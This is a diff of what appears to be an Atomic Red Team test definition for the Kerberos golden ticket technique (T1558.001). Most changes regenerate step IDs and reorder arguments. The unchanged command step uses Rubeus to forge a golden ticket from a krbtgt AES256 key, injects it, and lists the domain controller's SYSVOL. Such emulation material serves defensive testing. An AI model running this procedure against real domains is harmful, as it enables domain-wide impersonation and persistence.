@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "04d4622e-97ec-4782-b202-bee421b1bd51",
+      "id": "ab9a8cc9-8882-458d-b5d7-23fe60d60c79",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n\u003e%TEMP%\\golden.txt 2\u003e\u00261 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "695d5a49-2e71-4458-9efc-1d35aeafddcb",
+      "id": "0238a97d-3b55-432b-9eb1-520929f722af",
       "name": "Check dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "8f54a0b8-c5ad-4289-a429-c7731b01ef72",
+      "id": "6daf3c94-e9d5-4740-a4a8-50a63577a921",
       "name": "Resolve dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "39ee12f6-90a9-484d-b6ca-cf89d89ef1bb",
+      "id": "3a3b860b-0710-4058-80c5-ce41408ec914",
       "name": "Re-check dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -49,7 +49,7 @@
       "elevation_required": false
     },
     {
-      "id": "ab91164b-c9a8-4dd2-88d7-9c68cb42f712",
+      "id": "95f2615c-b90a-4ae6-a0bf-99202548b368",
       "name": "Check dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -60,7 +60,7 @@
       "elevation_required": false
     },
     {
-      "id": "4163d11e-dbd1-43a3-93f2-8a7e9279f39b",
+      "id": "b1692474-b46f-46f7-b47f-1bb05141661b",
       "name": "Resolve dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -71,7 +71,7 @@
       "elevation_required": false
     },
     {
-      "id": "d0bd04d0-6c07-41d3-9fc0-007aabaefee5",
+      "id": "c79bd051-f50a-4842-b05c-41b7f8d27275",
       "name": "Re-check dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -84,69 +84,51 @@
   ],
   "flows": [
     {
-      "s": "695d5a49-2e71-4458-9efc-1d35aeafddcb",
+      "s": "0238a97d-3b55-432b-9eb1-520929f722af",
       "p": "on-success",
-      "o": "04d4622e-97ec-4782-b202-bee421b1bd51"
+      "o": "ab9a8cc9-8882-458d-b5d7-23fe60d60c79"
     },
     {
-      "s": "695d5a49-2e71-4458-9efc-1d35aeafddcb",
+      "s": "0238a97d-3b55-432b-9eb1-520929f722af",
       "p": "on-failure",
-      "o": "8f54a0b8-c5ad-4289-a429-c7731b01ef72"
+      "o": "6daf3c94-e9d5-4740-a4a8-50a63577a921"
     },
     {
-      "s": "8f54a0b8-c5ad-4289-a429-c7731b01ef72",
+      "s": "6daf3c94-e9d5-4740-a4a8-50a63577a921",
       "p": "on-success",
-      "o": "39ee12f6-90a9-484d-b6ca-cf89d89ef1bb"
+      "o": "3a3b860b-0710-4058-80c5-ce41408ec914"
     },
     {
-      "s": "39ee12f6-90a9-484d-b6ca-cf89d89ef1bb",
+      "s": "3a3b860b-0710-4058-80c5-ce41408ec914",
       "p": "on-failure",
-      "o": "04d4622e-97ec-4782-b202-bee421b1bd51"
+      "o": "ab9a8cc9-8882-458d-b5d7-23fe60d60c79"
     },
     {
-      "s": "ab91164b-c9a8-4dd2-88d7-9c68cb42f712",
+      "s": "95f2615c-b90a-4ae6-a0bf-99202548b368",
       "p": "on-success",
-      "o": "04d4622e-97ec-4782-b202-bee421b1bd51"
+      "o": "ab9a8cc9-8882-458d-b5d7-23fe60d60c79"
     },
     {
-      "s": "ab91164b-c9a8-4dd2-88d7-9c68cb42f712",
+      "s": "95f2615c-b90a-4ae6-a0bf-99202548b368",
       "p": "on-failure",
-      "o": "4163d11e-dbd1-43a3-93f2-8a7e9279f39b"
+      "o": "b1692474-b46f-46f7-b47f-1bb05141661b"
     },
     {
-      "s": "4163d11e-dbd1-43a3-93f2-8a7e9279f39b",
+      "s": "b1692474-b46f-46f7-b47f-1bb05141661b",
       "p": "on-success",
-      "o": "d0bd04d0-6c07-41d3-9fc0-007aabaefee5"
+      "o": "c79bd051-f50a-4842-b05c-41b7f8d27275"
     },
     {
-      "s": "d0bd04d0-6c07-41d3-9fc0-007aabaefee5",
+      "s": "c79bd051-f50a-4842-b05c-41b7f8d27275",
       "p": "on-failure",
-      "o": "04d4622e-97ec-4782-b202-bee421b1bd51"
+      "o": "ab9a8cc9-8882-458d-b5d7-23fe60d60c79"
     }
   ],
   "tags": [
-    "T1558.001",
-    "atomic-red-team"
+    "T1558",
+    "T1558.001"
   ],
   "input_arguments": [
-    {
-      "name": "account",
-      "type": "string",
-      "description": "Account to impersonate",
-      "value": "$ENV:username"
-    },
-    {
-      "name": "krbtgt_aes256_key",
-      "type": "string",
-      "description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
-      "value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
-    },
-    {
-      "name": "local_folder",
-      "type": "path",
-      "description": "Local path of Rubeus executable",
-      "value": "$Env:temp"
-    },
     {
       "name": "local_executable",
       "type": "string",
@@ -164,6 +146,24 @@
       "type": "string",
       "description": "Targeted Active Directory domain FQDN",
       "value": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""
+    },
+    {
+      "name": "account",
+      "type": "string",
+      "description": "Account to impersonate",
+      "value": "$ENV:username"
+    },
+    {
+      "name": "krbtgt_aes256_key",
+      "type": "string",
+      "description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
+      "value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
+    },
+    {
+      "name": "local_folder",
+      "type": "path",
+      "description": "Local path of Rubeus executable",
+      "value": "$Env:temp"
     }
   ]
 }
